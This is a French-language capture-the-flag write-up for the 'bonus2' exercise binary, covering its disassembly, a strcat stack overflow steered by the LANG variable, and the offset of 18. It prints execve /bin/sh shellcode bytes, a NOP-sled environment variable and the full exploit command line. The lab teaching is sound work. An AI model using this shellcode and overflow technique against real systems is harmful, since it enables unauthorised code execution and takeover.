## bonus2

En désassemblant le binaire on observe deux fonctions: `main()` et
`greetuser()`. On voit également un appel a `getenv("LANG")`, plusieurs appel a `memcmp()`, et un appel a `strcat()` dans la fonction `greetuser()`.

Le binaire prend deux arguments qu'il va copier dans des buffers avec
`strncpy()`.

Les appels a `memcmp()` évalue la valeur de `LANG`, pour les string `nl` et
`fi`, et définis la globale `_language` a `0`, `1` ou `2`.

La string qui est affiché en sortie change selon la valeur de `_language`, mais
l'appel a `strcat()` est éffectué peut importe cette valeur.

Définissont donc la variable d'environnement `LANG` a `fi`, et lancons le
binaire avec gdb.

On va essayer de faire overflow l'appel a `strcat()`.

![image](https://user-images.githubusercontent.com/29956389/90021177-32556200-dcb1-11ea-81cc-3a22d43af3cc.png)

Le segfault est causé par le deuxieme argument. Localisons l'offset:

![image](https://user-images.githubusercontent.com/29956389/90021443-90824500-dcb1-11ea-83f2-604ed34a7c32.png)

![image](https://user-images.githubusercontent.com/29956389/90021555-b871a880-dcb1-11ea-8385-e44c453d2c43.png)

L'offset est a 18.

On insère donc notre shellcode + nopsled dans l'environnement:

`$ echo -ne
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' > /tmp/shellcode.bin`

`$ export SLEDCODE=$(python -c 'print "\x90"*420')$(cat /tmp/shellcode.bin)`

On localise l'adresse du sled:

`(gdb)> x/4s *((char**)environ + 8)`

`> de 0xbffff733 a 0xbffff8fc`

Soit `0xbffff805` vers le milieu. Ce qui nous donne:

`$ ./bonus2 $(python -c 'print [40 bytes de remplissage]') $(python -c 'print [18 bytes de remplissage] + [Adresse nopsled]')`

Soit:

`$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "i"*18 +
"\x05\xf8\xff\xbf"')`

![image](https://user-images.githubusercontent.com/29956389/90023240-ca544b00-dcb3-11ea-9769-3236d13ffefd.png)
